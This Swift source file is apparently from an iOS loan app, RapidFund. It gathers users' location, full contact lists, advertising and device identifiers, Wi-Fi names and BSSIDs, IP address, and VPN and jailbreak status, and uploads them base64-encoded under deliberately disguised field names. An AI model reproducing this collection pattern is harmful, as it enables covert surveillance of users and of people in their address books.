//
//  RPFReportManager.swift
//  RapidFund
//
//  Created by 毛亚恒 on 2024/7/15.
//

import UIKit
import SwiftyJSON
import RxSwift
import RxCocoa

enum RFAnalysisScenenType:Int {
    case Register = 1
    case IDType = 2
    case IDInformation = 3
    case FacePhoto = 4
    case Personal = 5
    case Work = 6
    case Contacts = 7
    case BankCard = 8
    case StartApply = 9
    case EndApply = 10
}

class RPFReportManager: NSObject {
    private override init() {}
    static let shared = RPFReportManager()
    let bag = DisposeBag()
    
    /**
     {
       "aface": "",  //省
       "curls": "CN",//国家code
       "untidy": "China",//国家
       "creature": "OLA Bar And RESTAURANT (Dabang Cooperation Guangchang Branch)",//街道
       "whichever": "31.24643134910169",//经度
       "scampering": "121.4511185077306",//维度
       "lambgambolling": "Shanghai",//市
       "towards": "Jing'an",//混淆字段
       "skipping": "Jing'an"//混淆字段
     }
     */
    func saveLocation(para: [String: Any]){
        RapidApi.shared.postLocationData(para: para)
            .subscribe(onNext: { [weak self] json in
                guard let `self` = self else {return}
                
            },
            onError: { [weak self] error in
                guard let `self` = self else {return}

            })
            .disposed(by: bag)

        
    }
    /**
     {
     "pointed": "",//混淆字段
     "clutched": "989fdcf7-1c27-412e-85f4-04f7f8e1f406",
     "pitch": "989fdcf7-1c27-412e-85f4-04f7f8e1f406"
     }
     */
    
    func saveGoogleMarket(){
        var param: [String : Any] = [String : Any]()
        
        param["clutched"] = RapidIDFV
        param["pitch"] =  RapidIDFA
        param["pointed"] = getRPFRandom()
        
        RapidApi.shared.postGoogleMarketData(para: param)
            .subscribe(onNext: { [weak self] json in
                guard let `self` = self else {return}
                
            },
            onError: { [weak self] error in
                guard let `self` = self else {return}

            })
            .disposed(by: bag)
        
    }
    /**
     // 通讯录,type=3
     [
     {
       "lonely": "+6281296611393,+6281296611393",
       "across": "1653818330000",
       "faced": "",
       "toput": "",
       "roomed": "",
       "morelike": "1653818095000",
       "wasan": "ayah"
     },
     {
       "lonely": "+6281296611392,+6281296611391",
       "across": "1653818330000",
       "faced": "",
       "toput": "",
       "roomed": "",
       "morelike": "1653818095000",
       "wasan": "ddd"
     }
     ]
     */
    
    func saveAdressBook(persons: [[String:Any]]){
        
        let jsonStr = persons.toJSONString
        var param: [String : Any] = [String : Any]()
        param["dismay"] = "3"
        param["exclaiming"] = getRPFRandom()
        param["valley"] = getRPFRandom()
        
        guard let jsonBase64 = jsonStr?.base64Encode else {
            return 
        }
        param["trouble"] = jsonBase64
        RapidApi.shared.postAdressBookData(para: param)
            .subscribe(onNext: { [weak self] json in
                guard let `self` = self else {return}
                
            },
            onError: { [weak self] error in
                guard let `self` = self else {return}

            })
            .disposed(by: bag)
        
    }
    /**
     {
     "comfortably": "ios", // 系统类型
     "yawned": "15.6.2",  // 系统版本
     "poet": 1677412062512, // 上次登录时间，毫秒数
     "dneed": "com.credit.instant.ios", // 包名
     "company": {
       "painting": 70, //电池百分比
       "artist": 0, //是否正在充电(yes: 1, no: 0)
     },
     "imagine":{ //app不用管
       "andthe": "",
       "traffic": "",
       "cinemas": "",
       "shops": {
         "untidy": "",
         "curls": "",
         "aface": "",
         "lambgambolling": "",
         "towns": "",
         "creature": ""
       }
     },
     "build": {
       "clutched": "bcf4bbc47e313cee",
       "pitch": "bcf4bbc47e313cee",
       "whowould": "00:EC:0A:65:89:6B", // 设备mac
       "covered": 1677486615496, // 系统当前时间，单位毫秒
     //    "roof": "74553635", // 设备运行时间，单位毫秒 //忽略
       "andbiscuits": 0, // 是否使用代理(yes:1,no:0)
       "munching": 0, // 是否使用vpn(yes:1,no:0)
       "doorstep": 0, // 是否越狱(yes: 1, no: 0)
       "is_simulator" : 0, // 是否是模拟器(yes: 1, no: 0)    
       "rug": "en", // 设备语言
       "forget": "MTN-Stay Safe", // 网络运营商名称
       "llnever": "WIFI", // 网络类型 2G/3G/4G/5G/WIFI/OTHER
       "ravenous": "GMT+8", // 时区的 ID
       "cracker": 33162972 // 设备启动毫秒数    
     },
     "toeat": {
       "orangeade": "QC_Reference_Phone", //给空字符串
       "bequite": "iPhone", // 设备名牌
       "nicer": 8,  //给空字符串
       "nail": 736, // 设备高度
       "hung": "SS's iPhone",
       "opener": 414, // 设备宽度
       "tin": "iPhone 6s Plus", // 设备型号
       "opening": "5.5" // 物理尺寸
       "rugs": "7.1.2", // 系统版本
     },
     "couldwrap": {
       "ofthe": "10.0.226.79",//内网ip
       "middle": [
         {
           "wasan": "Shu_Xing",
           "oil": "68:d7:9a:7b:71:36",
           "whowould": "68:d7:9a:7b:71:36",
           "suggested": "Shu_Xing"
         },
         {
           "wasan": "Shu_Xing",
           "oil": "68:d7:9a:7b:71:36",
           "whowould": "68:d7:9a:7b:71:36",
           "suggested": "Shu_Xing"
         }
       ],
       "heat": {
         "wasan": "Shu_Xing" //  当前的 wifi 名称，传 SSID 即可
         "oil": "68:D7:9A:7B:71:36", // 当前的 wifi BSSID
         "whowould": "68:D7:9A:7B:71:36", // 当前的 wifi MAC
         "suggested": "Shu_Xing", // 当前的 wifi SSID
       },
       "finetime": 0
     },
     "orangeadeand": {
       "bottles": "44522557440", // 未使用存储大小
       "cutlery": "63968497664",  // 总存储大小
       "towels": "2085601280", // 总内存大小
       "bedding": "639598592"  // 未使用内存大小
     }
     }
     */
    
    func saveDeviceInfo(){
        UIDevice.current.isBatteryMonitoringEnabled = true
        let batteryLevel = UIDevice.current.batteryLevel
        var param: [String : Any] = [String : Any]()
        param["comfortably"] = OsPlatform
        param["yawned"] = RapidSystemVersion
        param["poet"] = GetInfo(kRapidLoginTime)
        param["dneed"] = AppProjectName
        param["company"] = ["painting": Int(batteryLevel * 100), "artist": isPhoneCharging() ? 1 : 0]
       
        param["build"] = ["clutched":RapidIDFV, 
                          "pitch" : RapidIDFA,
                          "whowould": "",
                          "covered":Int(Date().timeIntervalSince1970 * 1000),
                          "andbiscuits": isUsedProxy() ? 1 : 0,
                          "munching": isVPNEnabled() ? 1 : 0,
                          "doorstep": isJailbroken() ? 1 : 0,
                          "is_simulator": isRunningOnSimulator() ? 1 : 0,
                          "rug": deviceLanguage(),
                          "forget": RPFDeviceManager.getDeviceSupplier(),
                          "llnever": RPFDeviceManager.getNetWorkType(),
                          "ravenous": RPFDeviceManager.getTimeZone(),
                          "cracker": RPFDeviceManager.getPhoneRunTime()]
        
        param["toeat"] = ["orangeade":"", 
                          "bequite" : "IPhone",
                          "nicer": "",
                          "nail":kScreenHeight,
                          "opener": kScreenWidth,
                          "hung": UIDevice.current.name,
                          "tin": ModelName,
                          "opening": ScreenInch,
                          "rugs": RapidSystemVersion]
        
        param["orangeadeand"] = ["bottles": getDiskSpace(total:false), 
                                 "cutlery" : getDiskSpace(total:true),
                                 "towels": getMemoryInfo(total: true),
                                 "bedding":  getDiskSpace(total: false)]
        let wifiInfo = RPFDeviceManager.getWiFiName()?.first
        let wifiPara: [String : Any] = ["wasan":wifiInfo?.ssid ?? "",
                                        "suggested" : wifiInfo?.ssid ?? "",
                                        "oil" : wifiInfo?.bssid ?? "",
                                        "whowould": wifiInfo?.bssid ?? ""] 
        
        
        if (wifiInfo?.ssid ?? "").isEmpty {
            param["couldwrap"] = ["ofthe":deviceIP() ?? "", 
                                  "finetime" : "0",
                                  "middle" : [],
                                  "heat":  ""]
        }else{
            param["couldwrap"] = ["ofthe":deviceIP() ?? "", 
                                  "finetime" : "1",
                                  "middle" : [wifiPara],
                                  "heat":  wifiPara]
        }
//        let jsonPara = ["trouble" : param.toJSONString?.base64Encode]
        guard let jsonBase64 = param.toJSONString?.base64Encode else {
            return 
        }
        let jsonPara = ["trouble" : jsonBase64]
        RapidApi.shared.postDevicInfoData(para: jsonPara)
            .subscribe(onNext: { [weak self] json in
                guard let `self` = self else {return}
                
            },
            onError: { [weak self] error in
                guard let `self` = self else {return}

            })
            .disposed(by: bag)
        
    }
   
    /**
    "andthey": "1000460",   // 产品ID 
    "stones": "2",  // 上报场景类型：1、注册 2、认证选择 3、证件信息 4、人脸照片 5、个人信息 6、工作信息 7、紧急联系人 8、银行卡信息9、开始申贷 10、结束申贷
    "risking": "",  // 用户申贷全局订单号，不用管
    "tolight": "671342B4-CC8C-395B-9792-2D3D885535E2", // idfv
    "torch": "",  //苹果：idfa，安卓gaid
    "scampering": -105.458102, // 经度
    "whichever": 22.401038, // 维度
    "naps": "1635131498", // 开始时间
    "yawnedtoo": "1635131551" ,   // 结束时间
    "peace": 22.401038, // 混淆字段
     */

    func saveAnalysis(pId: String, type: RFAnalysisScenenType, startTime: String, longitude: String, latitude: String){
        var param: [String : Any] = [String : Any]()
        param["andthey"] = pId
        param["stones"] = type.rawValue
        param["risking"] = ""
        param["tolight"] = RapidIDFV
        param["torch"] = RapidIDFA
        param["scampering"] = longitude
        param["whichever"] = latitude
        param["naps"] = startTime
        param["yawnedtoo"] = "\(Int(Date().timeIntervalSince1970) * 1000)"
        param["peace"] = getRPFRandom()
      
        RapidApi.shared.postAnalysisData(para: param)
            .subscribe(onNext: { [weak self] json in
                guard let `self` = self else {return}
                
            },
            onError: { [weak self] error in
                guard let `self` = self else {return}

            })
            .disposed(by: bag)
        
    }
    
    
}
